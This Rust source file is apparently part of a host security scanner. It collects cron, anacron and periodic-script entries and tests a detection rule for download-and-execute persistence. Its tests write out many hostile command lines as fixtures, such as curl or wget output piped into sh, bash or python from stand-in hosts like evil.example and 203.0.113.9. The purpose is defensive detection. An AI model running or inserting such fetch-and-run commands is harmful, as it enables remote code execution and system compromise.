use super::Collector;
use crate::homefs::HomeFile;
use crate::models::Fact;
use serde_json::Value;
use std::collections::HashSet;
use std::path::{Path, PathBuf};

pub struct CronEntriesCollector;

/// Where each cron keeps the crontabs users install with `crontab -e`, one file per user:
/// Debian's cron and Alpine's busybox in `crontabs/`, cronie (Fedora, RHEL, Arch) directly in
/// `/var/spool/cron`, openSUSE's cronie in `tabs/`. Reading only the first meant another user's
/// crontab was never seen on Fedora or openSUSE. `/etc/crontabs` is Alpine's real folder (the
/// spool path is a link to it); a folder reached twice is read once.
const USER_SPOOL_DIRS: &[&str] = &[
    "/var/spool/cron/crontabs",
    "/var/spool/cron",
    "/var/spool/cron/tabs",
    "/etc/crontabs",
];

/// Folders whose executable files cron (or anacron) runs on a schedule, with that schedule.
/// `/etc/periodic` is Alpine's name for the same thing.
const PERIODIC_DIRS: &[(&str, &str)] = &[
    ("/etc/cron.hourly", "hourly"),
    ("/etc/cron.daily", "daily"),
    ("/etc/cron.weekly", "weekly"),
    ("/etc/cron.monthly", "monthly"),
    ("/etc/cron.yearly", "yearly"),
    ("/etc/periodic/15min", "every 15 minutes"),
    ("/etc/periodic/hourly", "hourly"),
    ("/etc/periodic/daily", "daily"),
    ("/etc/periodic/weekly", "weekly"),
    ("/etc/periodic/monthly", "monthly"),
];

/// The most lines of one periodic script turned into rows. Real ones are a screenful; past this
/// the file is reported as partly checked instead of filling memory with rows.
const MAX_SCRIPT_LINES: usize = 5000;

/// Which program decides whether a file in `/etc/cron.d` or `/etc/cron.daily` is run. The two
/// families disagree about file names, and reporting a file cron ignores is as wrong as missing
/// one it runs.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum CronFlavor {
    /// Debian's cron and run-parts, and busybox: a name must consist solely of ASCII letters,
    /// digits, underscores and hyphens (`cron(8)` on Debian). `x.disabled`, `x.dpkg-old` and
    /// `x~` are ignored.
    RunParts,
    /// cronie (Fedora, RHEL, Arch, openSUSE): everything except hidden files, editor backups
    /// (`#x`, `x~`) and package-manager leftovers (`.rpmsave`, `.rpmorig`, `.rpmnew`). A file
    /// named `x.disabled` **is** run.
    Cronie,
}

impl CronFlavor {
    /// From the cron binary installed. Unknown means the more permissive rule: a file that may be
    /// run is read.
    fn detect() -> Self {
        let busybox = std::fs::canonicalize("/usr/sbin/crond")
            .ok()
            .and_then(|p| p.file_name().map(|n| n == "busybox"))
            .unwrap_or(false);
        // Debian's own cron is `/usr/sbin/cron` on a Debian-family system. The binary name alone
        // does not say so: openSUSE installs cronie under that name.
        let debian_cron = Path::new("/etc/debian_version").exists()
            && Path::new("/usr/sbin/cron").exists()
            && !Path::new("/usr/sbin/crond").exists();
        if busybox || debian_cron {
            CronFlavor::RunParts
        } else {
            CronFlavor::Cronie
        }
    }

    /// Whether a file of this name in `/etc/cron.d` is loaded as a crontab.
    pub fn reads_cron_d(self, name: &str) -> bool {
        match self {
            CronFlavor::RunParts => run_parts_name(name),
            CronFlavor::Cronie => {
                !(name.is_empty()
                    || name.starts_with('.')
                    || name.starts_with('#')
                    || name.ends_with('~')
                    || [".rpmsave", ".rpmorig", ".rpmnew"]
                        .iter()
                        .any(|s| name.ends_with(s)))
            }
        }
    }

    /// Whether an executable file of this name in `/etc/cron.daily` (and its siblings) is run.
    pub fn runs_periodic(self, name: &str) -> bool {
        match self {
            CronFlavor::RunParts => run_parts_name(name),
            // Fedora's run-parts script: skips `*~`, `*,` and these suffixes.
            CronFlavor::Cronie => {
                !(name.is_empty()
                    || name.starts_with('.')
                    || name.ends_with('~')
                    || name.ends_with(',')
                    || [".rpmsave", ".rpmorig", ".rpmnew", ".swp", ".cfsaved", ",v"]
                        .iter()
                        .any(|s| name.ends_with(s)))
            }
        }
    }
}

fn run_parts_name(name: &str) -> bool {
    !name.is_empty()
        && name
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-')
}

fn row(source: &str, schedule: &str, command: &str) -> Fact {
    let mut fact = Fact::new();
    fact.insert("source".to_string(), Value::String(source.to_string()));
    fact.insert("schedule".to_string(), Value::String(schedule.to_string()));
    // Masked at the collector: a crontab line is where `curl -u user:password` and
    // `mysqldump -p<password>` live, and a finding is stored and forwarded.
    fact.insert(
        "command".to_string(),
        Value::String(super::cmdline::mask_command_line(command)),
    );
    fact
}

/// Parses one crontab-style file's text into fact rows. `has_user_field` distinguishes
/// `/etc/cron.d/*` and `/etc/crontab` syntax (`min hour dom month dow user command`) from a
/// personal `crontab -l` (`min hour dom month dow command`) — the extra column shifts where the
/// command starts.
///
/// Handles both the five-field time spec and the `@nickname` shorthand (`@reboot`, `@daily`, …).
/// The `@`-forms are not a curiosity: `@reboot curl … | sh` is the single most common persistence
/// one-liner, and the old parser — which assumed five whitespace-separated time fields — split it
/// so that the shell payload landed in the schedule and `sh` in the command, so BLWK-ACCT-001
/// (critical) never matched it. A one-token change to an attacker's crontab evaded the rule.
pub fn parse_cron_text(text: &str, source: &str, has_user_field: bool) -> Vec<Fact> {
    let mut rows = Vec::new();
    for line in text.lines() {
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        let fields = |n: usize| -> Option<Vec<&str>> {
            let mut out = Vec::with_capacity(n);
            let mut rest = line;
            for _ in 0..n - 1 {
                let (field, tail) = rest.split_once(char::is_whitespace)?;
                out.push(field);
                // Fields are separated by any run of blanks, not exactly one.
                rest = tail.trim_start();
            }
            (!rest.is_empty()).then(|| {
                out.push(rest);
                out
            })
        };
        let (schedule, command) = if line.starts_with('@') {
            // `@nickname [user] command`
            let n = if has_user_field { 3 } else { 2 };
            let Some(f) = fields(n) else { continue };
            (f[0].to_string(), f[n - 1])
        } else {
            let n = if has_user_field { 7 } else { 6 };
            let Some(f) = fields(n) else { continue };
            // An environment line (`MAILTO=root`, `PATH = /usr/bin`) is not an entry.
            if f[0].contains('=') || f[1].starts_with('=') {
                continue;
            }
            (f[..5].join(" "), f[n - 1])
        };
        rows.push(row(source, &schedule, command));
    }
    rows
}

/// Rows for `/etc/anacrontab`: `period delay job-identifier command`, where the period is a
/// number of days or `@monthly` and friends. On Fedora this file, not `/etc/crontab`, is what
/// runs `/etc/cron.daily`.
pub fn parse_anacrontab(text: &str, source: &str) -> Vec<Fact> {
    let mut rows = Vec::new();
    for line in text.lines() {
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        let mut parts = line.splitn(4, char::is_whitespace);
        let (Some(period), Some(delay)) = (parts.next(), parts.next()) else {
            continue;
        };
        // `SHELL=/bin/sh`, `RANDOM_DELAY=45`: settings, not jobs.
        let is_period = period.starts_with('@') || period.chars().all(|c| c.is_ascii_digit());
        if !is_period || !delay.chars().all(|c| c.is_ascii_digit()) {
            continue;
        }
        let rest = line[period.len()..].trim_start()[delay.len()..].trim_start();
        let Some((_id, command)) = rest.split_once(char::is_whitespace) else {
            continue;
        };
        let schedule = if period.starts_with('@') {
            format!("anacron {period}")
        } else {
            format!("anacron every {period} day(s)")
        };
        rows.push(row(source, &schedule, command.trim()));
    }
    rows
}

/// Rows for a script cron runs from `/etc/cron.daily` and its siblings: one per command line
/// (comments dropped, a line ending in `\` joined to the next), so the rules that read a crontab
/// entry's command read these too. Returns the rows and whether the script had more lines than
/// are checked.
pub fn parse_periodic_script(text: &str, source: &str, schedule: &str) -> (Vec<Fact>, bool) {
    let mut rows = Vec::new();
    let mut pending = String::new();
    for line in text.lines() {
        let line = line.trim();
        if pending.is_empty() && (line.is_empty() || line.starts_with('#')) {
            continue;
        }
        if let Some(head) = line.strip_suffix('\\') {
            pending.push_str(head.trim_end());
            pending.push(' ');
            continue;
        }
        pending.push_str(line);
        if rows.len() >= MAX_SCRIPT_LINES {
            return (rows, true);
        }
        rows.push(row(source, schedule, pending.trim()));
        pending.clear();
    }
    if !pending.trim().is_empty() {
        rows.push(row(source, schedule, pending.trim()));
    }
    (rows, false)
}

/// A file a compiled program, not a script, would be: nothing in it can be read as a command.
fn looks_binary(text: &str) -> bool {
    text.bytes().take(4096).any(|b| b == 0)
}

#[cfg(unix)]
fn is_executable(path: &Path) -> bool {
    use std::os::unix::fs::PermissionsExt;
    std::fs::metadata(path).is_ok_and(|m| m.permissions().mode() & 0o111 != 0)
}

#[cfg(not(unix))]
fn is_executable(_path: &Path) -> bool {
    true
}

/// Regular files directly inside `dir` (a link to one counts), sorted by name.
fn files_in(dir: &Path) -> Vec<(String, PathBuf)> {
    let Ok(entries) = std::fs::read_dir(dir) else {
        return Vec::new();
    };
    let mut out: Vec<(String, PathBuf)> = entries
        .flatten()
        .filter_map(|e| Some((e.file_name().into_string().ok()?, e.path())))
        // `metadata` does not open the file, so a pipe here is skipped, not waited on.
        .filter(|(_, path)| std::fs::metadata(path).is_ok_and(|m| m.is_file()))
        .collect();
    out.sort();
    out
}

/// Everything cron would run, read from the folders under `root` (`/` on a real machine).
/// `own_crontab` is the output of `crontab -l` for the scanning user, if it could be had.
fn collect_from(root: &Path, flavor: CronFlavor, own_crontab: Option<&str>) -> Vec<Fact> {
    let at = |p: &str| root.join(p.trim_start_matches('/'));
    let mut rows = Vec::new();
    // Reads one file, reporting (never hiding) one that could not be read or was cut short.
    // `private` marks a user's own crontab: not being allowed to read someone else's is the
    // ordinary state of an unprivileged scan, not something to report on every run.
    let read = |path: &Path, shown: &str, private: bool, rows: &mut Vec<Fact>| -> Option<String> {
        match super::read_system(path) {
            HomeFile::Found(read) => {
                if read.truncated {
                    rows.push(super::unread_row(Path::new(shown), super::TOO_LARGE));
                }
                Some(read.text)
            }
            HomeFile::Missing => None,
            HomeFile::Refused => {
                let denied = !crate::platform::is_root()
                    && std::fs::metadata(path).is_ok_and(|m| m.is_file());
                if !(private && denied) {
                    rows.push(super::unread_row(
                        Path::new(shown),
                        super::refused_reason(path),
                    ));
                }
                None
            }
        }
    };

    // Every user's crontab. The folders are root-only, so an unprivileged scan reads nothing
    // here; a privileged scan sees the entry planted in *another* user's crontab, which
    // `crontab -l` (current user only) never shows.
    let mut spool_dirs_seen: HashSet<PathBuf> = HashSet::new();
    let mut spool_entries: HashSet<(String, String)> = HashSet::new();
    for dir in USER_SPOOL_DIRS {
        let real = at(dir);
        let key = std::fs::canonicalize(&real).unwrap_or_else(|_| real.clone());
        if !spool_dirs_seen.insert(key) {
            continue;
        }
        for (name, path) in files_in(&real) {
            // busybox keeps a marker file next to the crontabs; hidden files are cron's own.
            if name == "cron.update" || name.starts_with('.') {
                continue;
            }
            let shown = format!("{dir}/{name}");
            if let Some(text) = read(&path, &shown, true, &mut rows) {
                for fact in parse_cron_text(&text, &shown, false) {
                    spool_entries.insert((
                        fact["schedule"].as_str().unwrap_or_default().to_string(),
                        fact["command"].as_str().unwrap_or_default().to_string(),
                    ));
                    rows.push(fact);
                }
            }
        }
    }

    // The scanning user's own crontab. Under root it is one of the spool files just read, so an
    // entry already seen there is not reported a second time under another name.
    if let Some(text) = own_crontab {
        rows.extend(
            parse_cron_text(text, "crontab", false)
                .into_iter()
                .filter(|fact| {
                    !spool_entries.contains(&(
                        fact["schedule"].as_str().unwrap_or_default().to_string(),
                        fact["command"].as_str().unwrap_or_default().to_string(),
                    ))
                }),
        );
    }

    // The system crontab. Has a user field, and carries the run-parts entries on Debian.
    if let Some(text) = read(&at("/etc/crontab"), "/etc/crontab", false, &mut rows) {
        rows.extend(parse_cron_text(&text, "/etc/crontab", true));
    }
    if let Some(text) = read(&at("/etc/anacrontab"), "/etc/anacrontab", false, &mut rows) {
        rows.extend(parse_anacrontab(&text, "/etc/anacrontab"));
    }

    // System-wide drop-ins, by the naming rule of the cron that is installed.
    for (name, path) in files_in(&at("/etc/cron.d")) {
        if !flavor.reads_cron_d(&name) {
            continue;
        }
        let shown = format!("/etc/cron.d/{name}");
        if let Some(text) = read(&path, &shown, false, &mut rows) {
            rows.extend(parse_cron_text(&text, &shown, true));
        }
    }

    // Scripts run from the periodic folders. A payload here never appears in any crontab.
    for (dir, schedule) in PERIODIC_DIRS {
        for (name, path) in files_in(&at(dir)) {
            if !flavor.runs_periodic(&name) || !is_executable(&path) {
                continue;
            }
            let shown = format!("{dir}/{name}");
            let Some(text) = read(&path, &shown, false, &mut rows) else {
                continue;
            };
            if looks_binary(&text) {
                continue;
            }
            let (script_rows, cut) = parse_periodic_script(&text, &shown, schedule);
            rows.extend(script_rows);
            if cut {
                rows.push(super::unread_row(
                    Path::new(&shown),
                    "it has more lines than are checked, so the rest was not looked at",
                ));
            }
        }
    }
    rows
}

impl Collector for CronEntriesCollector {
    fn name(&self) -> &'static str {
        "cron_entries"
    }

    fn collect(&self) -> anyhow::Result<Vec<Fact>> {
        // Personal crontab — absence (exit status, "no crontab for user") is normal, not an error.
        let own = crate::sandbox::quiet_command("crontab")
            .arg("-l")
            .output()
            .ok()
            .filter(|o| o.status.success())
            .map(|o| {
                let mut out = o.stdout;
                out.truncate(super::MAX_COLLECTOR_READ_BYTES as usize);
                String::from_utf8_lossy(&out).into_owned()
            });
        Ok(collect_from(
            Path::new("/"),
            CronFlavor::detect(),
            own.as_deref(),
        ))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn commands(rows: &[Fact]) -> Vec<(String, String)> {
        rows.iter()
            .filter(|r| r.contains_key("command"))
            .map(|r| {
                (
                    r["source"].as_str().unwrap().to_string(),
                    r["command"].as_str().unwrap().to_string(),
                )
            })
            .collect()
    }

    fn write(root: &Path, rel: &str, text: &str) -> PathBuf {
        let path = root.join(rel.trim_start_matches('/'));
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(&path, text).unwrap();
        path
    }

    #[cfg(unix)]
    fn make_executable(path: &Path) {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(path, std::fs::Permissions::from_mode(0o755)).unwrap();
    }

    const PAYLOAD: &str = "* * * * * curl -s http://203.0.113.9/u | sh\n";

    #[test]
    fn parses_personal_crontab() {
        let text = "# comment\n0 6 * * * /home/user/script.sh --flag\n";
        let rows = parse_cron_text(text, "crontab", false);
        assert_eq!(rows.len(), 1);
        assert_eq!(rows[0].get("schedule").unwrap(), "0 6 * * *");
        assert_eq!(
            rows[0].get("command").unwrap(),
            "/home/user/script.sh --flag"
        );
    }

    #[test]
    fn parses_system_cron_d_with_user_field() {
        let text = "0 7 * * * root /usr/local/bin/daily-check.sh\n";
        let rows = parse_cron_text(text, "/etc/cron.d/example", true);
        assert_eq!(rows.len(), 1);
        assert_eq!(
            rows[0].get("command").unwrap(),
            "/usr/local/bin/daily-check.sh"
        );
    }

    #[test]
    fn at_reboot_curl_pipe_sh_is_parsed_as_one_command_not_split() {
        // The evasion: `@reboot` has no five-field time spec, so the old parser mangled it and the
        // critical curl-pipe-sh rule never matched. The whole payload must land in `command`.
        let personal = parse_cron_text(
            "@reboot curl -s https://evil.example/x.sh | sh\n",
            "crontab",
            false,
        );
        assert_eq!(personal.len(), 1);
        assert_eq!(personal[0].get("schedule").unwrap(), "@reboot");
        assert_eq!(
            personal[0].get("command").unwrap(),
            "curl -s https://evil.example/… | sh"
        );

        // And with a user field (system crontab / cron.d).
        let system = parse_cron_text(
            "@daily root wget -O- http://evil | bash\n",
            "/etc/crontab",
            true,
        );
        assert_eq!(system.len(), 1);
        assert_eq!(system[0].get("schedule").unwrap(), "@daily");
        assert_eq!(
            system[0].get("command").unwrap(),
            "wget -O- http://evil | bash"
        );
    }

    #[test]
    fn env_assignment_lines_in_etc_crontab_are_ignored() {
        // /etc/crontab starts with SHELL=/PATH= lines that are not cron entries.
        let text = "SHELL=/bin/sh\nPATH=/usr/bin:/bin\nMAILTO = ops at example dot com now\n17 *\t* * *\troot\tcd / && run-parts /etc/cron.hourly\n";
        let rows = parse_cron_text(text, "/etc/crontab", true);
        assert_eq!(rows.len(), 1);
        assert_eq!(
            rows[0].get("command").unwrap(),
            "cd / && run-parts /etc/cron.hourly"
        );
    }

    #[test]
    fn fields_separated_by_several_blanks_still_give_the_whole_command() {
        // Columns aligned with runs of spaces: the command used to start one field too early.
        let rows = parse_cron_text(
            "*/5  *  *  *  *   root   curl -s http://203.0.113.9/u | sh\n",
            "/etc/cron.d/x",
            true,
        );
        assert_eq!(rows[0]["schedule"], "*/5 * * * *");
        assert_eq!(rows[0]["command"], "curl -s http://203.0.113.9/… | sh");
    }

    #[test]
    fn a_secret_on_a_crontab_line_is_not_kept() {
        let secret = format!("{}{}", "Zq7xK2mN8v", "B4cR9tY6wL1pD3fH5jS0aG");
        let rows = parse_cron_text(
            &format!("0 3 * * * mysqldump -uroot -p{secret} db | gzip > /srv/db.gz\n"),
            "crontab",
            false,
        );
        let kept = serde_json::to_string(&rows).unwrap();
        assert!(
            !kept.contains(&secret) && !kept.contains(&secret[..12]),
            "{kept}"
        );
        assert!(kept.contains("mysqldump -uroot -p"));
    }

    #[test]
    fn the_spool_of_every_cron_is_read() {
        // cronie keeps crontabs directly in /var/spool/cron, openSUSE in tabs/, Debian in
        // crontabs/, Alpine in /etc/crontabs. All four must be read.
        for (spool, user) in [
            ("/var/spool/cron/alice", "alice"),
            ("/var/spool/cron/tabs/bob", "bob"),
            ("/var/spool/cron/crontabs/carol", "carol"),
            ("/etc/crontabs/dave", "dave"),
        ] {
            let root = tempfile::tempdir().unwrap();
            write(root.path(), spool, PAYLOAD);
            let got = commands(&collect_from(root.path(), CronFlavor::Cronie, None));
            assert_eq!(got.len(), 1, "{spool}: {got:?}");
            assert_eq!(got[0].0, spool);
            assert!(got[0].0.ends_with(user) && got[0].1.contains("| sh"));
        }
    }

    #[cfg(unix)]
    #[test]
    fn a_spool_reached_through_a_link_is_read_once() {
        // Alpine: /var/spool/cron/crontabs -> /etc/crontabs.
        let root = tempfile::tempdir().unwrap();
        write(root.path(), "/etc/crontabs/root", PAYLOAD);
        write(root.path(), "/etc/crontabs/cron.update", "root\n");
        std::fs::create_dir_all(root.path().join("var/spool/cron")).unwrap();
        std::os::unix::fs::symlink(
            root.path().join("etc/crontabs"),
            root.path().join("var/spool/cron/crontabs"),
        )
        .unwrap();
        let got = commands(&collect_from(root.path(), CronFlavor::RunParts, None));
        assert_eq!(got.len(), 1, "{got:?}");
    }

    #[test]
    fn roots_own_crontab_is_not_reported_twice() {
        let root = tempfile::tempdir().unwrap();
        write(root.path(), "/var/spool/cron/crontabs/root", PAYLOAD);
        // `crontab -l` as root prints the same file.
        let got = commands(&collect_from(
            root.path(),
            CronFlavor::RunParts,
            Some(PAYLOAD),
        ));
        assert_eq!(got.len(), 1, "{got:?}");
        assert_eq!(got[0].0, "/var/spool/cron/crontabs/root");

        // An unprivileged scan cannot read the spool, so `crontab -l` is the only source.
        let empty = tempfile::tempdir().unwrap();
        let got = commands(&collect_from(
            empty.path(),
            CronFlavor::RunParts,
            Some(PAYLOAD),
        ));
        assert_eq!(got.len(), 1);
        assert_eq!(got[0].0, "crontab");

        // A different entry in the user's own crontab is still reported.
        let other = "@reboot wget -qO- http://203.0.113.9/b | bash\n";
        let got = commands(&collect_from(
            root.path(),
            CronFlavor::RunParts,
            Some(other),
        ));
        assert_eq!(got.len(), 2, "{got:?}");
    }

    #[test]
    fn cron_d_names_follow_the_installed_cron() {
        let line = "* * * * * root curl -s http://203.0.113.9/u | sh\n";
        let root = tempfile::tempdir().unwrap();
        for name in [
            "job",
            "0hourly",
            "x.disabled",
            "y.dpkg-old",
            "z~",
            ".hidden",
            "w.rpmsave",
            "#v",
        ] {
            write(root.path(), &format!("/etc/cron.d/{name}"), line);
        }
        let names = |flavor| -> Vec<String> {
            commands(&collect_from(root.path(), flavor, None))
                .into_iter()
                .map(|(source, _)| source.trim_start_matches("/etc/cron.d/").to_string())
                .collect()
        };
        // Debian's cron(8): names "must consist solely of upper- and lower-case letters, digits,
        // underscores, and hyphens".
        assert_eq!(names(CronFlavor::RunParts), ["0hourly", "job"]);
        // cronie runs everything but hidden files, backups and rpm leftovers.
        assert_eq!(
            names(CronFlavor::Cronie),
            ["0hourly", "job", "x.disabled", "y.dpkg-old"]
        );
    }

    #[cfg(unix)]
    #[test]
    fn periodic_scripts_and_anacrontab_are_read() {
        let root = tempfile::tempdir().unwrap();
        let script =
            "#!/bin/sh\n# refresh\nset -e\ncurl -fsSL http://203.0.113.9/u \\\n  | sh\nexit 0\n";
        make_executable(&write(root.path(), "/etc/cron.daily/refresh", script));
        // Not executable, and a name run-parts skips: neither is run, neither is reported.
        write(root.path(), "/etc/cron.daily/notrun", script);
        make_executable(&write(root.path(), "/etc/cron.daily/old.bak", script));
        // A compiled program has no lines to read.
        make_executable(&write(
            root.path(),
            "/etc/cron.weekly/tool",
            "\x7fELF\0\0\0curl | sh\n",
        ));
        write(
            root.path(),
            "/etc/anacrontab",
            "SHELL=/bin/sh\nRANDOM_DELAY=45\n1\t5\tcron.daily\tnice run-parts /etc/cron.daily\n@monthly 45 fetch curl -s http://203.0.113.9/m | bash\n",
        );
        let rows = collect_from(root.path(), CronFlavor::RunParts, None);
        let got = commands(&rows);
        assert!(
            got.contains(&(
                "/etc/cron.daily/refresh".into(),
                "curl -fsSL http://203.0.113.9/… | sh".into()
            )),
            "{got:?}"
        );
        assert!(got.contains(&(
            "/etc/anacrontab".into(),
            "curl -s http://203.0.113.9/… | bash".into()
        )));
        assert!(got.contains(&(
            "/etc/anacrontab".into(),
            "nice run-parts /etc/cron.daily".into()
        )));
        assert!(got.iter().all(|(source, _)| !source.contains("notrun")
            && !source.contains("old.bak")
            && !source.contains("tool")));
        let schedules: Vec<&str> = rows
            .iter()
            .filter(|r| r["source"] == "/etc/anacrontab")
            .map(|r| r["schedule"].as_str().unwrap())
            .collect();
        assert_eq!(schedules, ["anacron every 1 day(s)", "anacron @monthly"]);
    }

    #[cfg(unix)]
    #[test]
    fn a_file_too_large_to_read_whole_is_reported_and_a_pipe_does_not_block() {
        let root = tempfile::tempdir().unwrap();
        // 4.3 MB of comments, then the payload: the part past the cap is not read, and says so.
        let mut big = "# padding padding padding padding\n".repeat(130_000);
        big.push_str("* * * * * root curl -s http://203.0.113.9/u | sh\n");
        assert!(big.len() as u64 > crate::collectors::MAX_COLLECTOR_READ_BYTES);
        write(root.path(), "/etc/cron.d/big", &big);
        // A pipe where the system crontab should be.
        std::fs::create_dir_all(root.path().join("etc")).unwrap();
        let fifo = root.path().join("etc/crontab");
        let c = std::ffi::CString::new(fifo.to_str().unwrap()).unwrap();
        // SAFETY: a valid NUL-terminated path and a plain mode.
        assert_eq!(unsafe { libc::mkfifo(c.as_ptr(), 0o600) }, 0);

        let (tx, rx) = std::sync::mpsc::channel();
        let path = root.path().to_path_buf();
        std::thread::spawn(move || {
            let _ = tx.send(collect_from(&path, CronFlavor::Cronie, None));
        });
        let rows = rx
            .recv_timeout(std::time::Duration::from_secs(20))
            .expect("a pipe must not block the collector");
        let unread: Vec<(&str, &str)> = rows
            .iter()
            .filter_map(|r| {
                Some((
                    r.get("path")?.as_str()?,
                    r.get(crate::homefs::COULD_NOT_READ)?.as_str()?,
                ))
            })
            .collect();
        assert!(
            unread.contains(&("/etc/cron.d/big", crate::collectors::TOO_LARGE)),
            "{unread:?}"
        );
        assert!(
            unread.iter().any(|(p, _)| *p == "/etc/crontab"),
            "{unread:?}"
        );
        // The rows that say so carry no `command`, so the rule over them is not a pass.
        assert!(commands(&rows).is_empty());
    }

    /// The real BLWK-ACCT-001 condition from the shipped rule pack.
    fn acct_001() -> crate::condition::Condition {
        let dir = Path::new(env!("CARGO_MANIFEST_DIR")).join("../../rules");
        let (rules, errors) = crate::engine::load_rules(&dir);
        assert!(errors.is_empty(), "{errors:?}");
        rules
            .into_iter()
            .find(|r| r.rule.id == "BLWK-ACCT-001")
            .expect("BLWK-ACCT-001 is in the pack")
            .condition
    }

    /// Whether a crontab line, read by the collector, makes the shipped rule fire.
    fn fires(rule: &crate::condition::Condition, command: &str) -> bool {
        let rows = parse_cron_text(&format!("* * * * * {command}\n"), "crontab", false);
        assert_eq!(rows.len(), 1, "{command}");
        rule.eval(&rows[0]).expect("the rule evaluates")
    }

    #[test]
    fn every_way_of_running_a_download_fires_the_rule() {
        let rule = acct_001();
        for command in [
            "curl -s http://203.0.113.9/u | sh",
            "curl -s http://203.0.113.9/u|sh",
            "curl -fsSL https://get.example.com/install.sh | bash",
            "wget -qO- https://get.example.com/x | bash -s -- --yes",
            "wget -O - https://get.example.com/x | /bin/sh",
            "curl -s https://get.example.com/x | /usr/bin/env bash",
            "curl -s https://get.example.com/x | sudo bash",
            "curl -s https://get.example.com/x | sudo -E bash -",
            "curl -s https://get.example.com/x | sudo -u deploy sh",
            "curl -s https://get.example.com/x | env DEBIAN_FRONTEND=noninteractive sh",
            "curl -s https://get.example.com/x | timeout 60 sh",
            "curl -s https://get.example.com/x | nice -n 19 /usr/bin/zsh",
            "curl -s https://get.example.com/x |& dash",
            "curl -s https://get.example.com/x | tee /tmp/x | sh",
            "/usr/bin/curl -s https://get.example.com/x | sh >/dev/null 2>&1",
            "cd /tmp && curl -s https://get.example.com/x | sh; rm -f x",
            "(curl -s https://get.example.com/x | sh) &",
            "curl -s https://get.example.com/x | python3",
            "curl -s https://get.example.com/x | python3 -",
            "curl -s https://get.example.com/x | sudo python",
            "wget -qO- https://get.example.com/x | perl",
            "bash -c \"$(curl -fsSL https://get.example.com/install.sh)\"",
            "/bin/sh -c \"$(wget -qO- https://get.example.com/install.sh)\"",
            "sh -c '`curl -s https://get.example.com/x`'",
            "bash -lc \"$(curl -fsSL https://get.example.com/x)\"",
            "eval \"$(curl -s https://get.example.com/x)\"",
            "python3 -c \"$(curl -s https://get.example.com/x.py)\"",
            "sh -c 'curl -s https://get.example.com/x | sh'",
            "sh <(curl -s https://get.example.com/x)",
            "bash <(wget -qO- https://get.example.com/x)",
            "/bin/bash -x <(curl -s https://get.example.com/x)",
            ". <(curl -s https://get.example.com/x)",
            "source <(curl -s https://get.example.com/x)",
        ] {
            assert!(fires(&rule, command), "must fire: {command}");
        }
    }

    #[test]
    fn ordinary_cron_jobs_do_not_fire_the_rule() {
        // The regex once flagged every ordinary `.sh` script. Each of these is a job people really
        // run: a script, a download handled as data, a health-check ping, a fallback.
        let rule = acct_001();
        for command in [
            "cd /home/user/proj && bash scripts/daily_job_scraper.sh >> log 2>&1",
            "/usr/local/bin/backup.sh",
            "/usr/local/bin/backup.sh | logger -t backup",
            "sh /opt/jobs/refresh.sh",
            "bash -c '/opt/jobs/refresh.sh && touch /var/run/refresh.ok'",
            "curl -fsS -m 10 --retry 5 -o /dev/null https://hc-ping.com/7a1c",
            "curl -fsS https://hc-ping.com/7a1c > /dev/null 2>&1",
            "/opt/jobs/run.sh && curl -fsS https://hc-ping.com/7a1c",
            "curl -fsS https://status.example.com/health || sh /usr/local/bin/alert.sh",
            "curl -fsS https://status.example.com/health || bash /usr/local/bin/restart.sh",
            "curl -s https://api.example.com/v1/items | jq .count >> /var/log/items.log",
            "curl -s https://api.example.com/v1/items | python3 -m json.tool > /srv/items.json",
            "curl -s https://api.example.com/v1/items | python3 -c 'import json,sys; print(len(json.load(sys.stdin)))'",
            "curl -s https://api.example.com/v1/items | perl -ne 'print if /ok/'",
            "curl -s https://example.com/list.txt | sort | uniq > /tmp/shlist",
            "curl -s https://example.com/key.gpg | sudo gpg --dearmor -o /usr/share/keyrings/x.gpg",
            "curl -s https://example.com/key.asc | sudo tee /etc/apt/keyrings/x.asc > /dev/null",
            "curl -s https://example.com/site.tar.gz | sudo tar xz -C /srv/www",
            "curl -s https://example.com/x | shasum -a 256 | grep -q abc",
            "curl -s https://example.com/x | sha256sum -c -",
            "curl -s https://example.com/x | ssh backup@host.example 'cat > /srv/x'",
            "wget -q -O /tmp/x.sh https://example.com/x.sh",
            "wget -q -O /tmp/feed.xml https://example.com/feed && /opt/jobs/parse.sh /tmp/feed.xml",
            "bash -c \"echo $(curl -s https://api.example.com/ip) >> /var/log/ip.log\"",
            "sh -c \"IP=$(curl -s https://api.example.com/ip); echo $IP\"",
            "bash -c \"$(cat /etc/job.cmd)\"",
            "/usr/bin/flock -n /tmp/sync.lock /usr/bin/rsync -a /srv/ backup:/srv/",
            "test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }",
            "[ -x /usr/lib/php/sessionclean ] && if [ ! -d /run/systemd/system ]; then /usr/lib/php/sessionclean; fi",
            "certbot -q renew --deploy-hook 'systemctl reload nginx'",
            "find /var/cache/app -type f -mtime +7 -delete | sh",
            "/usr/bin/wget-log-rotate.sh",
        ] {
            assert!(!fires(&rule, command), "must not fire: {command}");
        }
    }

    #[test]
    fn stock_periodic_scripts_do_not_fire_the_rule() {
        // Lines of the scripts Ubuntu 24.04 and Fedora 43 ship in /etc/cron.daily and
        // /etc/cron.hourly, which the collector now reads line by line.
        let rule = acct_001();
        let script = "#!/bin/sh\nset -e\nif [ -d /run/systemd/system ]; then\n    exit 0\nfi\n\
            if ! which dpkg > /dev/null; then exit 0; fi\n\
            exec /usr/lib/apt/apt.systemd.daily\n\
            /usr/sbin/anacron -s\n\
            if test -x /usr/bin/on_ac_power; then /usr/bin/on_ac_power >/dev/null 2>&1; fi\n\
            /usr/bin/savelog -c 7 status >/dev/null\n\
            [ -x /usr/bin/mandb ] && /usr/bin/mandb --quiet\n";
        let (rows, cut) = parse_periodic_script(script, "/etc/cron.daily/x", "daily");
        assert!(!cut && rows.len() >= 8);
        for row in &rows {
            assert!(!rule.eval(row).unwrap(), "{:?}", row["command"]);
        }
    }
}
